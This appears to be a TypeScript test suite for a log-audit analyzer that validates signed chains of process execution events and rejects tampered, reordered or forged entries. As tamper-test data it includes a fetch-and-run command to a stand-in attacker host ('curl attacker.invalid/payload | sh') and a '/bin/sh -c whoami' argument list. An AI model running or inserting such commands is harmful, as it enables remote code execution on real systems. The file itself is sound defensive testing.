import { createHash } from 'node:crypto'
import { expect, test } from 'bun:test'
import { readinessAuditDefinition, readinessTimingAllowed, validReadinessAuditParameters, eligibleReadinessAudit, eligibleReadinessChain, completeReadinessChains, matchesReadinessFact, readinessChainPayload, readinessAuditRule, readinessRole, readinessRoles, type ReadinessExecutionProof } from '../src/utils/events/analyzeReadinessAudit.ts'
import { configure, fixture, signed } from './analyze-readiness-audit-fixtures.ts'

test('only one complete signed native chain is eligible, independent of delivery delay', () => {
    const previous = process.env.READINESS_AUDIT_PROOF_PUBLIC_KEY
    try {
        configure(); const {logs,fact} = fixture(), good = signed(logs,fact)
        expect(readinessAuditRule.enabled).toBe(false)
        expect(logs.map(readinessRole)).toEqual([...readinessRoles])
        expect(eligibleReadinessChain(logs)).toBe(false)
        expect(eligibleReadinessChain(good)).toBe(true)
        for (const log of good) expect(eligibleReadinessAudit(log)).toBe(false)
        delete process.env.READINESS_AUDIT_PROOF_PUBLIC_KEY
        expect(eligibleReadinessChain(good)).toBe(false)
    } finally { if (previous === undefined) delete process.env.READINESS_AUDIT_PROOF_PUBLIC_KEY; else process.env.READINESS_AUDIT_PROOF_PUBLIC_KEY = previous }
})
test('each missing, duplicate, temporally reordered or additionally signed member retains the complete chain', () => {
    configure(); const {logs,fact}=fixture(), good=signed(logs,fact)
    for (let index=0; index<4; index++) {
        expect(eligibleReadinessChain(good.filter((_,i)=>i!==index))).toBe(false)
        expect(eligibleReadinessChain([...good,good[index]])).toBe(false)
        const copied=structuredClone(good); copied[index].metadata!.readiness_execution=good[0].metadata!.readiness_execution
        if(index) expect(eligibleReadinessChain(copied)).toBe(false)
    }
    // Arrival order is irrelevant; independently recorded process order must remain intact.
    expect(eligibleReadinessChain([...good].reverse())).toBe(true)
    const wrongTime=structuredClone(logs)
    wrongTime[1].timestamp=logs[3].timestamp
    wrongTime[1].sourceEventId=createHash('sha256').update(`inspur:audit:msg=audit(${(Date.parse(wrongTime[1].timestamp!) / 1000).toFixed(3)}:${wrongTime[1].metadata!.audit_id})`).digest('hex')
    expect(readinessChainPayload(wrongTime,fact)).toBeUndefined()
    const wrongSerial=structuredClone(logs)
    wrongSerial[1].metadata!.audit_id='1'
    wrongSerial[1].sourceEventId=createHash('sha256').update(`inspur:audit:msg=audit(${(Date.parse(wrongSerial[1].timestamp!) / 1000).toFixed(3)}:1)`).digest('hex')
    expect(readinessChainPayload(wrongSerial,fact)).toBeUndefined()
})
test('mismatched native process identity and invalid completion retain all events', () => {
    configure(); const {logs,fact}=fixture()
    for (const change of [{version:1}, {parentPid:999}, {execPid:999}, {execParentPid:999}, {execStartTicks:'0'}, {nonce:'bad'}, {host:'ovhcloud'}, {containerId:'bad'}, {execId:'bad'}, {bootId:'bad'},
        {previousStartedAt:fact.startedAt}, {finishedAt:fact.startedAt-1}, {startedAt:fact.finishedAt}, {namespacePid:0}, {parentStartTicks:'0'}]) {
        expect(readinessChainPayload(logs,{...fact,...change} as ReadinessExecutionProof)).toBeUndefined()
    }
})
test('every role rejects tampering, manual lookalikes and unexpected security context', () => {
    configure(); const {logs,fact}=fixture(), good=signed(logs,fact)
    for(let index=0;index<4;index++) {
        for(const change of [{level:'error'}, {host:'customer'}, {service:'other'}, {message:logs[index].message+'; curl attacker.invalid/payload | sh'}, {sourceEventId:'c'.repeat(64)}, {timestamp:'bad'}, {unexpected:'payload'}]) {
            const changed=structuredClone(good); Object.assign(changed[index],change)
            expect(eligibleReadinessChain(changed)).toBe(false)
        }
        for(const key of ['detections','organizationId','tenantId','body','unexpected']) {
            const changed=structuredClone(good); changed[index].metadata![key]='suspicious'
            expect(eligibleReadinessChain(changed)).toBe(false)
        }
        for(const [field,change] of [['process',{executable:'/tmp/pg_isready'}],['process',{arguments:['/bin/sh','-c','whoami']}], ['process',{parent_pid:'999'}],['process',{pid:'0'}],['process',{unexpected:'payload'}],['user',{id:'1000'}],['user',{login_id:'1000'}]] as const) {
            const changed=structuredClone(logs); Object.assign(changed[index].metadata![field] as object,change)
            expect(matchesReadinessFact(changed[index],fact)).toBe(false)
            expect(readinessChainPayload(changed,fact)).toBeUndefined()
        }
    }
    const forged=structuredClone(good); (forged[0].metadata!.readiness_execution as any).signature='A'.repeat(86)+'=='
    expect(eligibleReadinessChain(forged)).toBe(false)
    const changedFact=structuredClone(good); (changedFact[0].metadata!.readiness_execution as any).fact.execId='c'.repeat(64)
    expect(eligibleReadinessChain(changedFact)).toBe(false)
    const changedMember=structuredClone(good); (changedMember[0].metadata!.readiness_execution as any).members[3].eventDigest='d'.repeat(64)
    expect(eligibleReadinessChain(changedMember)).toBe(false)
})

test('malformed proof envelopes and mixed scheduled executions fail closed', () => {
    configure(); const {logs,fact}=fixture(), good=signed(logs,fact)
    for(const proof of [null,{},[],{fact}, {fact,members:[]}, {...good[0].metadata!.readiness_execution as object,extra:'payload'}]) {
        const changed=structuredClone(good); changed[0].metadata!.readiness_execution=proof
        expect(eligibleReadinessChain(changed)).toBe(false)
    }
    const other=fixture(1)
    for(let role=0;role<4;role++) {
        const mixed=structuredClone(good); mixed[role]=other.logs[role]
        expect(eligibleReadinessChain(mixed)).toBe(false)
    }
})

test('batch groups isolate unrelated logs and reject overlapping or ambiguous execution identities', () => {
    configure(); const first=fixture(), second=fixture(1)
    const one=signed(first.logs,first.fact), two=signed(second.logs,second.fact)
    const noise={...one[3],sourceEventId:'unrelated',message:'suspicious arbitrary command'}
    expect(completeReadinessChains([...one,noise,...two])).toHaveLength(2)
    for(let index=0;index<4;index++) expect(completeReadinessChains([...one,one[index]])).toHaveLength(0)
    second.fact.execId=first.fact.execId
    const collision=signed(second.logs,second.fact)
    expect(completeReadinessChains([...one,...collision])).toHaveLength(0)
})

test('authenticated timing is evaluated against persisted Event parameters', () => {
    configure(); const {logs,fact}=fixture(), parameters=readinessAuditDefinition.parameters
    expect(validReadinessAuditParameters(parameters)).toBe(true)
    expect(readinessTimingAllowed(fact,parameters)).toBe(true)
    for(const change of [{previousStartedAt:fact.startedAt-100}, {previousStartedAt:fact.startedAt-16000}, {finishedAt:fact.startedAt+1001}]) {
        const changed={...fact,...change}
        expect(readinessChainPayload(logs,changed)).toBeDefined()
        expect(eligibleReadinessChain(signed(logs,changed))).toBe(true)
        expect(readinessTimingAllowed(changed,parameters)).toBe(false)
        expect(readinessTimingAllowed(changed,{maxDurationMs:2000,minIntervalMs:1,maxIntervalMs:20000})).toBe(true)
    }
    for(const invalid of [undefined,null,{}, {...parameters,extra:1}, {...parameters,maxDurationMs:0}, {...parameters,minIntervalMs:0}, {...parameters,maxIntervalMs:3999}, {...parameters,maxDurationMs:1.5}]) {
        expect(validReadinessAuditParameters(invalid)).toBe(false)
        expect(readinessTimingAllowed(fact,invalid)).toBe(false)
    }
    const otherHost=structuredClone(logs), otherFact={...fact,host:'other-native-host'}
    for(const log of otherHost) {
        log.host=otherFact.host
        log.sourceEventId=createHash('sha256').update(`${log.host}:audit:msg=audit(${(Date.parse(log.timestamp!) / 1000).toFixed(3)}:${log.metadata!.audit_id})`).digest('hex')
    }
    expect(eligibleReadinessChain(signed(otherHost,otherFact))).toBe(true)
})
